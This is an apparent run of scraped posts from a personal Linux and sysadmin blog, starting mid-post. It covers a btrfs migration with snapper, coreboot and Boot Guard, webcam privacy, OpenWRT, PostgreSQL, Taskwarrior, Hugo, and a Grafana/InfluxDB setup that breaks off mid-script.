-\u0026gt; Running build hook: [base] -\u0026gt; Running build hook: [udev] -\u0026gt; Running build hook: [autodetect] -\u0026gt; Running build hook: [modconf] -\u0026gt; Running build hook: [block] -\u0026gt; Running build hook: [filesystems] -\u0026gt; Running build hook: [keyboard] -\u0026gt; Running build hook: [fsck] ==\u0026gt; Generating module dependencies ==\u0026gt; Creating gzip-compressed initcpio image: /boot/initramfs-linux.img ==\u0026gt; Image generation successful ==\u0026gt; Building image from preset: /etc/mkinitcpio.d/linux.preset: \u0026#39;fallback\u0026#39; -\u0026gt; -k /boot/vmlinuz-linux -c /etc/mkinitcpio.conf -g /boot/initramfs-linux-fallback.img -S autodetect ==\u0026gt; Starting build: 4.11.7-1-ARCH -\u0026gt; Running build hook: [base] -\u0026gt; Running build hook: [udev] -\u0026gt; Running build hook: [modconf] -\u0026gt; Running build hook: [block] ==\u0026gt; WARNING: Possibly missing firmware for module: aic94xx ==\u0026gt; WARNING: Possibly missing firmware for module: wd719x -\u0026gt; Running build hook: [filesystems] -\u0026gt; Running build hook: [keyboard] -\u0026gt; Running build hook: [fsck] ==\u0026gt; Generating module dependencies ==\u0026gt; Creating gzip-compressed initcpio image: /boot/initramfs-linux-fallback.img ==\u0026gt; Image generation successful Last but not least, we\u0026rsquo;ll install the btrfs package:\n[root@vagrant ~]# pacman-db-upgrade ==\u0026gt; Pre-4.2 database format detected - upgrading... [root@vagrant ~]# pacman -S btrfs-progs --force ... Note: The --force is necessary. Last is to do a reboot, for testing that the system is on the newest state.\nLiveCD for the migration To perform the migration it needs to be done from a live system. At first I want to do this with the official archlinux image, yet it has an issue booting in Virtualbox. It just won\u0026rsquo;t start. Instead i took grml as live system. Poweroff the vagrant box and open it in Virtualbox. Jack in the live CD and start the VM from Virtualbox. Only importance is that the right architecture is selected. The vagrant image is x86_64 so needs grml to be in 64 Bit.\nYou need another system to perform the migrate. The migrate from ext4 to btrfs won\u0026rsquo;t work with a running rootfs ontop.\nNow to run the migration as discussed before\u0026quot;\nbtrfs-convert /dev/sda2 This took 38 seconds for this simple filesystem.\nWe\u0026rsquo;ll mount the disk now:\nmount /dev/sda2 /mnt/ cd /mnt btrfs subvolume list . ID 256 gen 3 top level 5 path ext2_saved Seems good, finished up the migration by deleting the ext2_saved subvolume. One thing that surprised me was the name. Why wasn\u0026rsquo;t it name ext4_saved? Anyway, let\u0026rsquo;s move on:\nbtrfs subvolume delete ext2_saved Delete subvolume (no-commit): \u0026#39;/mnt/ext2_saved\u0026#39; One important change that need to be done here, the VM is configure to run with UUID, that needs to change to the block devices for now. Replace the UUID in the /etc/fstab and /boot/grub/grub.cfg. I change the parameter #GRUB_DISABLE_LINUX_UUID=true to GRUB_DISABLE_LINUX_UUID=true in /etc/default/grub and created a new config file.\n[root@vagrant ~]# grub-mkconfig -o /boot/grub/grub.cfg Before I could restart the VM I have to add btrfs hook to the /etc/mkinitcpio.conf. Else the kernel don\u0026rsquo;t know what to start from.\nHOOKS=\u0026#34;base udev autodetect modconf block filesystems keyboard fsck btrfs\u0026#34; Run:\nmkinitcpio -p linux ==\u0026gt; Building image from preset: /etc/mkinitcpio.d/linux.preset: \u0026#39;default\u0026#39; -\u0026gt; -k /boot/vmlinuz-linux -c /etc/mkinitcpio.conf -g /boot/initramfs-linux.img ==\u0026gt; Starting build: 4.11.7-1-ARCH -\u0026gt; Running build hook: [base] -\u0026gt; Running build hook: [udev] -\u0026gt; Running build hook: [autodetect] -\u0026gt; Running build hook: [modconf] -\u0026gt; Running build hook: [block] -\u0026gt; Running build hook: [filesystems] -\u0026gt; Running build hook: [keyboard] -\u0026gt; Running build hook: [fsck] -\u0026gt; Running build hook: [btrfs] ==\u0026gt; Generating module dependencies ==\u0026gt; Creating gzip-compressed initcpio image: /boot/initramfs-linux.img ==\u0026gt; Image generation successful ==\u0026gt; Building image from preset: /etc/mkinitcpio.d/linux.preset: \u0026#39;fallback\u0026#39; -\u0026gt; -k /boot/vmlinuz-linux -c /etc/mkinitcpio.conf -g /boot/initramfs-linux-fallback.img -S autodetect ==\u0026gt; Starting build: 4.11.7-1-ARCH -\u0026gt; Running build hook: [base] -\u0026gt; Running build hook: [udev] -\u0026gt; Running build hook: [modconf] -\u0026gt; Running build hook: [block] ==\u0026gt; WARNING: Possibly missing firmware for module: wd719x ==\u0026gt; WARNING: Possibly missing firmware for module: aic94xx -\u0026gt; Running build hook: [filesystems] -\u0026gt; Running build hook: [keyboard] -\u0026gt; Running build hook: [fsck] -\u0026gt; Running build hook: [btrfs] ==\u0026gt; Generating module dependencies ==\u0026gt; Creating gzip-compressed initcpio image: /boot/initramfs-linux-fallback.img ==\u0026gt; Image generation successful Note: I did this from a chroot on the liveCD\nA reboot later and everything was working!\n[root@vagrant ~]# mount |grep btrf /dev/sda2 on / type btrfs (rw,relatime,space_cache,subvolid=5,subvol=/) Doing the job At this point we do have a similar setup as my laptop. So what\u0026rsquo;s next?\nI went to the btrfs wiki to get more details. What sees to me the best practices is to create a subvolume, move all necessary data into it and mount it directly. This can be done via the mount command and the subvol parameter. This will also be the default subvolume. By setting this as default i won\u0026rsquo;t have to change anything in grub. yay\nFirst step was to create the a readonly snapshot of the filesystem:\n[root@vagrant ~]# btrfs subvolume snapshot -r / /snapshot Create a readonly snapshot of \u0026#39;/\u0026#39; in \u0026#39;//snapshot\u0026#39; [root@vagrant ~]# ls -l /snapshot/ total 20 lrwxrwxrwx 1 root root 7 Mar 26 21:57 bin -\u0026gt; usr/bin drwxr-xr-x 1 root root 0 Jan 6 2014 boot drwxr-xr-x 1 root root 0 Jan 6 2014 dev drwxr-xr-x 1 root root 2268 Jul 2 21:47 etc drwxr-xr-x 1 root root 14 Jan 6 2014 home -rwxr-xr-x 1 root root 1588 Jan 6 2014 inside.sh lrwxrwxrwx 1 root root 7 Mar 26 21:57 lib -\u0026gt; usr/lib lrwxrwxrwx 1 root root 7 Mar 26 21:57 lib64 -\u0026gt; usr/lib drwx------ 1 root root 0 Jan 6 2014 lost+found drwxr-xr-x 1 root root 0 May 31 2013 mnt drwxr-xr-x 1 root root 0 May 31 2013 opt dr-xr-xr-x 1 root root 0 Jan 6 2014 proc drwxr-x--- 1 root root 54 Jul 2 21:47 root drwxr-xr-x 1 root root 10 Jul 2 21:46 run lrwxrwxrwx 1 root root 7 Mar 26 21:57 sbin -\u0026gt; usr/bin drwxr-xr-x 1 root root 14 May 31 2013 srv dr-xr-xr-x 1 root root 0 Jan 6 2014 sys drwxrwxrwt 1 root root 0 Jul 2 21:47 tmp drwxr-xr-x 1 root root 70 Jul 2 21:27 usr drwxr-xr-x 1 root root 0 Jul 2 21:14 vagrant drwxr-xr-x 1 root root 116 Jul 2 21:28 var This will create a folder in the / folder, called snapshot (surprise ;-) ).\nNext on the agenda is to create the subvolume:\n[root@vagrant ~]# btrfs subvolume create /rootfs Create subvolume \u0026#39;//rootfs\u0026#39; [root@vagrant ~]# ls -l /rootfs/ total 0 By now we have a offline copy of the rootfs in /snapshot and the destination mount point in /rootfs. This calls for rsync. Simply copy all data from the snapshot into the subvolume for rootfs.\n[root@vagrant ~]# cd /snapshot/ [root@vagrant snapshot]# rsync -raPh ./* /rootfs/ ... It might be useful to run the rsync command first with -n for a dry run. Make sure that you have enough disk space. I\u0026rsquo;m not sure if the deduplication is here working. Next is to set the default subvolume:\n[root@vagrant mnt]# btrfs subvolume set-default 266 / Now to the real exciting moment, the reboot. ANNNNND it did work ;-)\nvagrant ssh Last login: Sun Jul 2 21:49:14 2017 from 10.0.2.2 [vagrant@vagrant ~]$ mount|grep btrf /dev/sda2 on / type btrfs (rw,relatime,space_cache,subvolid=266,subvol=/rootfs) Hurray! Last is to clean up the mess and be done with it!\n[root@vagrant ~]# mount -t btrfs -o subvol=/ /dev/sda2 /mnt/ [root@vagrant ~]# cd /mnt/ [root@vagrant mnt]# btrfs subvolume delete snapshot [root@vagrant mnt]# rm -rvf ./{var,....} [root@vagrant ~]# ls -lha /mnt/ total 0 drwxr-xr-x 1 root root 12 Jul 2 22:35 . drwxr-xr-x 1 root root 174 Jul 2 22:06 .. drwxr-xr-x 1 root root 174 Jul 2 22:06 rootfs Be aware when you remove the files from the top level structure not to remove the roofs folder!\nendgame: snapper After this long journey we can finally install snapper!\n[root@vagrant ~]# pacmann -S snapper -bash: pacmann: command not found [root@vagrant ~]# ^C [root@vagrant ~]# pacman -S snapper resolving dependencies... looking for conflicting packages... Packages (2) boost-libs-1.64.0-3 snapper-0.5.0-2 Total Download Size: 2.82 MiB Total Installed Size: 13.76 MiB :: Proceed with installation? [Y/n] y :: Retrieving packages... boost-libs-1.64.0-3-x86_64 2.3 MiB 2.52M/s 00:01 [########################################################################################] 100% snapper-0.5.0-2-x86_64 546.6 KiB 14.4M/s 00:00 [########################################################################################] 100% (2/2) checking keys in keyring [########################################################################################] 100% (2/2) checking package integrity [########################################################################################] 100% (2/2) loading package files [########################################################################################] 100% (2/2) checking for file conflicts [########################################################################################] 100% (2/2) checking available disk space [########################################################################################] 100% :: Processing package changes... (1/2) installing boost-libs [########################################################################################] 100% Optional dependencies for boost-libs openmpi: for mpi support (2/2) installing snapper [########################################################################################] 100% Optional dependencies for snapper pam: pam_snapper [installed] :: Running post-transaction hooks... (1/1) Arming ConditionNeedsUpdate... We\u0026rsquo;ll configure snapper by running:\n[root@vagrant ~]# snapper -c root create-config / [root@vagrant ~]# snapper list Type | # | Pre # | Date | User | Cleanup | Description | Userdata -------+---+-------+------+------+---------+-------------+--------- single | 0 | | | root | | current | pacman hooks for snapper To meaning use snapper, we\u0026rsquo;ll use the hook function of pacman. Creating each time a new snapshot of the rootfs when an update is run. For this we can use finished script, simply install snap-pac.\n[root@vagrant ~]# pacman -S snap-pac resolving dependencies... looking for conflicting packages... Packages (1) snap-pac-1.1-1 Total Download Size: 0.01 MiB Total Installed Size: 0.03 MiB :: Proceed with installation? [Y/n] y :: Retrieving packages... snap-pac-1.1-1-any 13.3 KiB 0.00B/s 00:00 [########################################################################################] 100% (1/1) checking keys in keyring [########################################################################################] 100% (1/1) checking package integrity [########################################################################################] 100% (1/1) loading package files [########################################################################################] 100% (1/1) checking for file conflicts [########################################################################################] 100% (1/1) checking available disk space [########################################################################################] 100% :: Processing package changes... (1/1) installing snap-pac [########################################################################################] 100% :: Running post-transaction hooks... (1/3) Arming ConditionNeedsUpdate... (2/3) Performing snapper post snapshots for the following configurations... (3/3) You are installing snap-pac, so no post transaction snapshots will be taken. Every new installation or upgrade will lead the post/pre hook to run:\n[root@vagrant ~]# pacman -Ss sipcalc community/sipcalc 1.1.6-2 an advanced console based ip subnet calculator. [root@vagrant ~]# pacman -S sipcalc resolving dependencies... looking for conflicting packages... Packages (1) sipcalc-1.1.6-2 Total Download Size: 0.02 MiB Total Installed Size: 0.05 MiB :: Proceed with installation? [Y/n] y :: Retrieving packages... sipcalc-1.1.6-2-x86_64 23.4 KiB 219K/s 00:00 [########################################################################################] 100% (1/1) checking keys in keyring [########################################################################################] 100% (1/1) checking package integrity [########################################################################################] 100% (1/1) loading package files [########################################################################################] 100% (1/1) checking for file conflicts [########################################################################################] 100% (1/1) checking available disk space [########################################################################################] 100% :: Running pre-transaction hooks... (1/1) Performing snapper pre snapshots for the following configurations... ==\u0026gt; root: 1 :: Processing package changes... (1/1) installing sipcalc [########################################################################################] 100% :: Running post-transaction hooks... (1/2) Arming ConditionNeedsUpdate... (2/2) Performing snapper post snapshots for the following configurations... ==\u0026gt; root: 2 [root@vagrant ~]# snapper list Type | # | Pre # | Date | User | Cleanup | Description | Userdata -------+---+-------+---------------------------------+------+---------+-------------------+--------- single | 0 | | | root | | current | pre | 1 | | Sun 02 Jul 2017 10:42:17 PM UTC | root | number | pacman -S sipcalc | post | 2 | 1 | Sun 02 Jul 2017 10:42:17 PM UTC | root | number | pacman -S sipcalc | Awesome!\nPut it all together. It did work as intend on my laptop. I\u0026rsquo;m very happy about this! It might be interesting to see how well this snapshoting is working over time. But snapper provides also some auto clean ups. But only time can tell how well this is working.\nso far so good.\nbest regards\nAkendo\n","permalink":"https://blog.akendo.eu/post/2017-07-02-btrfs-migration/","tags":null,"title":"btrfs migration"},{"categories":null,"contents":"\nCurrently I\u0026rsquo;m looking for a topic to write a thesis about. One of the topics that came to my mind was coreboot. It happend some weeks ago during the presentation from Trammell Hudson about \u0026lsquo;Bootstraping a slightly more secure laptop\u0026rsquo;.\nKnowing that coreboot is running very well on a Lenovo x230 devices and in general on x220/x210/x200 devices I was wondering if there might be any support for my x240? I went to the project page, there have a neat device list. However my x240 wasn\u0026rsquo;t listed. Why?\nA search later I found some critical information. One post on phoronix. Next one on the blog of mjg.\nVery simple: Intel added Hardware-based boot integrity protection. This ensure that only the manufacturer of the device can write new firmware to it. Intel Boot Guard (short: BG) is an extended security feature to ensure that security is working well with UEFI. It also prevent anyone to write custom firmware to it. coerboot is such custom firmware. So no coreboot on my x240\u0026hellip;.\nAnother idea was to look into the security bubble of the net to find some more information about BG. There is a quite interesting detail about BG. While Intel provides this function, it is not mandatory for a manufacture to enable it. However Lenovo seems to keep it quite tight. Almost, because they missed to enable BG on some of they devices correctly. An attack could add it\u0026rsquo;s own key to the hardware and create a persistent backdoor that wouldn\u0026rsquo;t allow any changes. Simple because Lenovo forgot to enable the hardware switch of BG. This switch fuses a key into the hardware. Something that can be done only once. In this presentation you can find some more details.\nUnfortunately the x240 wasn\u0026rsquo;t on the list. So I might need to switch to another devices to do some work with coreboot.\nbest regards Akendo\n","permalink":"https://blog.akendo.eu/post/2017-07-01-coreboot/","tags":null,"title":"coreboot"},{"categories":[],"contents":"Many people have covered they webcam with a sticker. They do this to prevent some bad people to take a picture of you.\nI personal like this, but it misses a point. When someone is capable to access the webcam of your computer, you do have another set of problems.\nSure there are some software flaws that could allow access to the cam. For example via Google Chromes and a WebRTC session. But that would trigger the indicator light of the cam. A green, yellow or blue light next to the cam-slot. Therefore you can notice that the cam is active. A cover over the cam might protected against this type of software flaws.\nSo can assume that unless someone can control the indicator light, that you have to notice any usage. Does this mean you only protects against the usage case where someone is in control of the webcam hardware and is able to turn of the indicator light?\nHowever to not turn on the indicator light you would have direct hardware access to the computer. There lies the issue. When someone is able to access the hardware directly, he can do whatever he want with the rest of it. You can install a keylogger to record any input. He can see what\u0026rsquo;s on your screen and he can install whatever software he wants onto the computer.\nMost of the time this happens over a RAT (Remote Access Trojan). When such software is on your computer, taking a picture of you via the webcam seems the least of the problems.\n","permalink":"https://blog.akendo.eu/post/2017-05-27-webcams/","tags":[],"title":"Some thoughts about webcams"},{"categories":[],"contents":"I have been criticize many times in my past for mistakes that were done. However, they just pointed the finger on what\u0026rsquo;s wrong. \u0026ldquo;You need to do this better\u0026rdquo;. That\u0026rsquo;s not helpful. Somehow this sounds normal for many, but it\u0026rsquo;s bad.\nDon\u0026rsquo;t get me wrong, criticism is essential for everyone. We need it to become better in things we do. The questions is often how it\u0026rsquo;s done. One example that comes to my mind is grammar. I\u0026rsquo;m not good with grammar.\nEspecially when I wrote documentation. There is a always something I get wrong.\nBut you can tell someone that he made mistake in his writing or you can tell them that there are bad because of such mistakes. One points at a flaw, which is nice. The other is making you feel bad. Even worse you\u0026rsquo;re being punished for a mistake. But this way you\u0026rsquo;ll not get better with it.\nPushing for mistakes is a common patter I have seen over the past years. But it\u0026rsquo;s like a poison and not productive. Sure sometimes it can help. But most of the times it\u0026rsquo;s not.\nWhat\u0026rsquo;s the point I want to make: Try not to do this. Try to add value to the things. Sometimes just the attempt is of value. It\u0026rsquo;s much about how we judge others and it\u0026rsquo;s hard to not fall for this pit. Point out where a mistake lies. Tell them how to detect them. Maybe how to prevent them for the further. Don\u0026rsquo;t make them feel bad about the mistake, help to feel good doing so and that they learning about it.\nbest regards Akendo\n","permalink":"https://blog.akendo.eu/post/2017-05-27-notes-about-people/","tags":[],"title":"Some notes about people and mistakes"},{"categories":["python"],"contents":"On a quick note:\nI wasn\u0026rsquo;t able to find a simple solution to convert a classicly formated netmask to a CIDR format in python. So I wrote this line:\nsum([ bin(int(bits)).count(\u0026#34;1\u0026#34;) for bits in m_netmask.split(\u0026#34;.\u0026#34;) ]) Place into a function:\ndef netmask_to_cidr(m_netmask): return(sum([ bin(int(bits)).count(\u0026#34;1\u0026#34;) for bits in m_netmask.split(\u0026#34;.\u0026#34;) ])) It takes a netmask as a string (for example 255.255.255.0) and will convert it into a binary representation, then it will count the ones in it. Subsequently it computes the sum of the count result. Very simple.\nSome examples:\nIn [79]: netmask_to_cidr(\u0026#39;255.255.255.0\u0026#39;) Out[79]: 24 In [80]: In [80]: netmask_to_cidr(\u0026#39;255.255.255.255\u0026#39;) Out[80]: 32 In [81]: netmask_to_cidr(\u0026#39;255.255.255.128\u0026#39;) Out[81]: 25 Please be aware it assume you have a valid netmask as input.\nYou can also see it here\nhave fun!\n","permalink":"https://blog.akendo.eu/post/2017-05-24-python-netmask-to-cidr/","tags":["python"],"title":"Converting a netmask to CIDR with vanilla python"},{"categories":["databases","postgresql"],"contents":"Quick note how to upgrade a postgresql from version 9.3 to 9.5. You\u0026rsquo;ll need to start both services. In my case postgresql 9.3 was listen on port 5432 (defaul port) and postgresql on port 5433.\nNow you need to run:\npg_dumpall |psql -d postgres -p 5433 Depending on the size of your dbs it will take some time. When this went well you can connect to the postgresql-9.5 to check that the databases are correctly migrated. Next is to stop postgresql-9.3 and reconfigure postgresql-9.5 to listen on the default port. Restart postgres-9.5 and here we go!\nbest regards akendo\n","permalink":"https://blog.akendo.eu/post/2017-09-05-migration-postgresql/","tags":["postgresql"],"title":"Postgres data migration"},{"categories":[],"contents":" To keep track of my tasks I use a tool called Task Warrior. It\u0026rsquo;s a command line tools. Therefor a perfect fit for me.\nOne issue that did arise: Recurrent tasks. Basically every task that need to re-run over a regular period of time.\nThe problem is when this type of task is synced onto different workstations. With taskd you can share all tasks betweens hosts.\nSo when the same tasks is recurrent, it will be created on each of the different workstation. All new task have a unique UUID. With this UUID taskwarriror ensures that tasks with the name can exists and don\u0026rsquo;t collide. This means that n many workstations will create n times the same recurrent task.\nThere is no way to create a single task over the n workstations. Task Warrior has no fix for this in the moment. Only a workaround: By setting following parameter in the .taskrc you can control the behavir of taskwarriror.\nrecurrence=off So you need to set the recurrence parameter to off on n - 1 workstations. Only a single remains allowed to create the recurrence tasks. This way you can make sure nothing gets messed up.\nI got this workaround from Paul Beckingham\u0026rsquo;s Comment in the Jira of taskwarriror.\nAnyway best regards Akendo\n","permalink":"https://blog.akendo.eu/post/2017-01-05-taskwarrior-prevent-dupicated/","tags":[],"title":"Task Warrior - Preventing duplicated recurrent tasks"},{"categories":["OpenWRT","Linux","Security"],"contents":"cheaper Router as a general problem Some years ago,I had a very cheap router. A TP-Link DIR 600. The router made my very unhappy. For several reasons. First, the software that was operating on the Router were very limited. How limited? I was able only to set a few firewall rules (DNAT for example) on my own. When I recall correctly, i wasn\u0026rsquo;t able to redirect any port.\nSecond, the little insight to the devices I had. You just got a very basic logger on the devices that would only give the minimal amount of information. This is especially a problem when you tried to debug connections. My ISP at that time made it even harder, because they did Carrier-grade NAT. Means they was not really giving me any real public IP, but a private IP. The router on the other side of the DLS Modem them NAT them back. Not nice for forwarding traffic.\nLast, the software had some flaws. To replace this devices was one of the better decision [0], when the router router apocalypse came I was prepared. The TP-LINK DIR 600 was affect very much. However back at the time this wasn\u0026rsquo;t much of an issue. The software had just some limitation and that drove me crazy.\nOpenWrt is a Linux distribution, that is intended to support small router(CPE). It\u0026rsquo;s focus in general is on WiFi. Another possible software to run on such small router is for example ddwrt.\nHowever the old router (DIR 600) of mine didn\u0026rsquo;t supported any other Software. No drivers for some important part of the device. So a new devices was at need.\nI choose OpenWRT over ddwrt for a simple reason. I know some people that work with it, they do freifunk. They heavily rely on OpenWrt and modified the software to they needs. Most of them did work with the TP-Link WDR3600.\nWhy such small devices after all? I mean it might be more reasonable to get better hardware to use it as router. The answer is simple. The router is very cheap. They don\u0026rsquo;t draw much power and I don\u0026rsquo;t have to play around with the hardware.\nIn addition to this, I liked to play with embedded hardware around. This way I would have touched something else than an x86 system. The TP-Link WDR3600 based on a MIPS CPU Architecture. Something completely different.\nOpenWrt as router The installation process is simple. You need to download the generic-tl-wdr3600-v1-squashfs-factory.bin. Drop this file in the update firmware page of the original firmware and you good to go! But you can find more details here\nNext is to login via telnet to the box.\nPlease note: I had some upgrade issue I documented a while ago. One problem of OpenWRT is that you don\u0026rsquo;t have any type of auto update. At least I haven\u0026rsquo;t found them yet.\nInstall software on a openwrt router Here some basic things. OpenWRT does provide a software like debians apt called opkg. information.\nInstallation openvpn There are some remarks to the openvpn installation. They are using different libraries for SSL by default. You\u0026rsquo;ll get something like polarssl. I installed openvpn with openssl support. That makes my configuration quite alike and does not create snowflakes configuration files.\nopkg install openvpn-openssl Besides, you shouldn\u0026rsquo;t trust any SSL implementation that hasn\u0026rsquo;t been audit. openssl is bad, broken and fuck up. But I would bet it\u0026rsquo;s broken the least. Especially since the hearthbleed incident they infrastructure gain a big amount of attenchen and money. All what raises the changes that the software stop being such waste. Another possible ssl implementation to use would be libressl, but this getting of topic.\nInstallation openssh While OpenWRT provides a dropbear ssh server, i always like to use OpenSSH instead. So you can install and setup openssh via:\nopkg install openssh-server Please note you need to disable the dropbear in favour of the ssh.\nIssues My experience so far: Very well. By now I do have a SSH Server on it with well set crypto settings in place (yay). WiFi is someway okish. Some of the hardware support for Wifi isn\u0026rsquo;t working. Nothing to bad.\nIPv6 is pain One exception is there: IPv6.\nFor some reason the IPv6 Stack is broken. It\u0026rsquo;s not broken in it\u0026rsquo;s function. I\u0026rsquo;m able to send and receive data. But any linux client does not get a correct routing information. Windows clients are not affected.\nThis made this strange.\nI have a router in ISP provided modem. It connects me to my cable IPS. I have a Dual Stack Lite (DS-Lite) on this modem. By the way, don\u0026rsquo;t get starting about the security on this device\u0026hellip;. DS-Lite means: I have fully working IPv6 address and again does my provided do a Carrier-grade NAT for IPv4. That\u0026rsquo;s acceptable.\nSo what this modem does, it announce it\u0026rsquo;s IPv6 Network Mask to the network. My OpenWRT is the next router that does the forwarding. It acts as gateway and protects me from the everything. I don\u0026rsquo;t trust the ISP modem. I do NAT for the IPv4.\nBut because this a nativ IPv6 modem it tries to auto configure IPv6 to all clients in the network. For this we\u0026rsquo;ll need Router Advertisement.\nHowever the linux client seems to get the IPv6 route wrong. Instead of replacing the IPv6 with the correct IPv6 address of the OpenWRT Router, it keeps in using the IPv6 address of the modem. Windows however does get the correct IPv6 route\u0026hellip;. I does to the OpenWRT gateway and that forwards all the IPv6 taffic to the modem. My linux however is miss the hope and can\u0026rsquo;t reach out to the web correctly with IPv6.\nIt seems to be a kernel bug in OpenWRT. But I might have to dig into this in sometime\u0026hellip; My fix for the moment is to just have the IPv6 Route place manual on my linux clients\u0026hellip;and don\u0026rsquo;t let me get starting on newer android devices\u0026hellip;.\nSecurity aftermath Two years ago(around 2015) there were something that was called \u0026lsquo;plastic router apocalypse\u0026rsquo;. tldr; Poor products with bad design flaws became victims to bad persons.\nLong Story: Most router are left unattended and unmaintained. Because they are produces very cheap and on mass. They\u0026rsquo;re place only once after you purchases a DSL connection. No one brother about this type of devices.\nAt some point, some guys started to take a look onto them and looking for some security flaws. What they found was bad. Many flaws. This was partial bad because most of this plastic router are exposed directly to the internet. So they were victim to bad guys.\nSo replacing it\nResources [0] http://www.s3cur1ty.de/m1adv2013-003\n€dit: It took me 3.2 years to get this from a draft to a finished document\u0026hellip;.so things are moving!\n","permalink":"https://blog.akendo.eu/post/2017-24-04-using-openwrt/","tags":[],"title":"Using OpenWRT as Router"},{"categories":["security"],"contents":"This morning I got a info about a security breach at Atlassian. To be precise, HipChat. The \u0026ldquo;HipChat security notice\u0026rdquo;. The news page I was reading additionally pointed out a security vulnerability in Atlassians confluence. I got a chill in this moment. Somehow I got this wrong. I understood there would be a new vulnerability.\nBecause of a bad Internet connection I wasn\u0026rsquo;t able to the entry article(just got the header). So I rushed to shutdown my confluence instances. When a better Internet connection was available I continued to read. It turned out to be an already fixed vulnerability that was not related to the data breach of HipChat.\nWhen you\u0026rsquo;re going to write an article about a security incidents, don\u0026rsquo;t point out to the most recent (and already) fixed vulnerability. People gets confused about this\u0026hellip;. or at me.\nbest regards akendo\n","permalink":"https://blog.akendo.eu/post/2017-04-25-hipchatbreachconfusion/","tags":[" databreach","security","news","infosec"],"title":"News about the HipChat breach that confused me"},{"categories":["Blog"],"contents":"Hugo allows you to get very easy a new theme. Sometimes this new theme have some option you don\u0026rsquo;t want. For example:In this theme there is by default two additional menus. One for tags, for for categories. That\u0026rsquo;s something nice.\nHowever, both menu had a very long list, that than needed scrolling bar. The scrolling bar broken than the design of the theme.\nMy fix for this was disable the two menu for categories and tags. For this I created custom layout pages to overwrite the themes ones. In Hugo there is an order how template documents are rendered.\n/layouts/section/SECTION.html /layouts/_default/section.html /layouts/_default/list.html /themes/THEME/layouts/section/SECTION.html /themes/THEME/layouts/_default/section.html /themes/THEME/layouts/_default/list.html As we can see the local folder in /layouts/ are checked first for any template pages to render. Followed by the _default type of a page. Only then comes the template pages of the theme.\nSo I copied the layout file of the theme to the local /layouts folder. In there I altered the template to not render the menus for categories and tags.\ncp themes/code-editor/layouts/partials/menu.html layouts/partials/ The file looks like this now:\n\u0026lt;nav class=\u0026#34;col-md-3\u0026#34;\u0026gt; \u0026lt;h3 class=\u0026#34;home-link\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;/\u0026#34;\u0026gt;{{ ( index $.Site.Data.translations $.Site.Params.locale ).root }}\u0026lt;/a\u0026gt;\u0026lt;/h3\u0026gt; \u0026lt;div id=\u0026#34;last-posts\u0026#34; class=\u0026#34;open\u0026#34;\u0026gt; \u0026lt;h3 data-open=\u0026#34;last-posts\u0026#34;\u0026gt;{{ .Site.Title }} - {{ ( index $.Site.Data.translations $.Site.Params.locale ).mostrecentposts }}\u0026lt;/h3\u0026gt; \u0026lt;ul\u0026gt; {{ range first 15 .Site.Pages }} \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;{{ .Permalink }}\u0026#34;\u0026gt;{{ .Title }}\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; {{ end }} \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/nav\u0026gt; Furthermore, I increased the amount of items that are listed from 10 to 15.\nso far akendo\n","permalink":"https://blog.akendo.eu/post/2017-03-29-notes-about-hugo/","tags":["Hugo"],"title":"Notes about Hugo"},{"categories":["Development","Testing","grafana"],"contents":"I attended the 33c3 in Hamburg. A awesome event, as always. One of the slogan: \u0026ldquo;use more bandwidth!\u0026rdquo;. To display the current amount of data that has been sent a dashboard (Note: Down to this time of the year) was created. I want to have something similar. So I started digging into the dash board while be on the congress. Which is running on grafana.\nGrafana What is grafana?\nGrafana is a open source metric analytics \u0026amp; visualization suite. It is most commonly used for visualizing time series data for infrastructure and application analytics but many use it in other domains including industrial sensors, home automation, weather, and process control.\nQuote from the docs\nA similar look, but with more details on bandwidth, this is the dashboard I created.\nSetup For testing it, I create a VM, a script that captures my traffic on a interface (wlan0) and a Database. You can download grafana with a fitting binary from the project page. My example VM was ubuntu 14.04, create with vagrant.\nwget https://grafanarel.s3.amazonaws.com/builds/grafana_4.0.2-1481203731_amd64.deb sudo apt-get install -y adduser libfontconfig sudo dpkg -i grafana_4.0.2-1481203731_amd64.deb Note: only use this type of installation for testing, for production use please add the repository!\nNext step is to read the getting started. You\u0026rsquo;ll recognize that a datasource is necessary. Using Plaintext is not a option.\nData sources / InfluxDB For the sake of simplicity, I used influxDB, as described here.\nWhat\u0026rsquo;s that? Again a quote from they docs\nInfluxDB is a time series database built from the ground up to handle high write and query loads. It is the second piece of the TICK stack. InfluxDB is meant to be used as a backing store for any use case involving large amounts of timestamped data, including DevOps monitoring, application metrics, IoT sensor data, and real-time analytics.\nI has a neat rest api you can sent your data to.\nInstallation Same simple tick like before for the installation:\nwget https://dl.influxdata.com/influxdb/releases/influxdb_1.1.1_amd64.deb sudo dpkg -i influxdb_1.1.1_amd64.deb Note: only use this type of installation for testing, for production use please add the repository!\nenable remote access for InfluxDB Because I didn\u0026rsquo;t create the data on the VM itself, a remote host needs access to the db. InfluxDB is configure to allow access ONLY from localhost. Yet without any further authentication, how great this is seems debatable. But for another node you need to change within the /etc/influxdb/influxdb.conf the auth-enabled from true to false.\nNote: This is only done of the sake of testing!\nInfluxDB create a db Just start the influx-shell and create a db. Note: The official way, as documented on github is broken\u0026hellip;.\ninflux -precision rfc3339 CREATE DATABASE mydb Get network data, the hacky way There are many great tools out for collecting network statics, I prefer for example vnstat. But for getting straightforward data it\u0026rsquo;s quite a pain. So instead I use python to do this job.\npsutil There is useful python module, called psutil. It can read data from the /proc/ filesystem in an easy fashion. To get the data send per second, you\u0026rsquo;ll need to read the /proc/net/dev. In there is a static for network interfaces.\nInter-| Receive | Transmit face |bytes packets errs drop fifo frame compressed multicast|bytes packets errs drop fifo colls carrier compressed eth0: 217872 1985 0 0 0 0 0 0 202460 1690 0 0 0 0 0 0 eth1: 237343 500 0 0 0 0 0 0 852594 594 0 0 0 0 0 0 lo: 262258 570 0 0 0 0 0 0 262258 570 0 0 0 0 0 0 docker0: 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 _ content of a /proc/net/dev file _\nNext is to select the interface of your desire and create the delta of the receive/transmitted byte and/or packets.\nHere\u0026rsquo;s the script to get the traffic in one second on an interface:\n#!/usr/bin/env python3 \u0026#34;\u0026#34;\u0026#34; Interface static Usage: interface-statistic.py help | --help | -h interface-statistic.py version| --version | -v interface-statistic.py \u0026lt;interface\u0026gt; Akendo 2016 Apache 2.0 \u0026#34;\u0026#34;\u0026#34; # 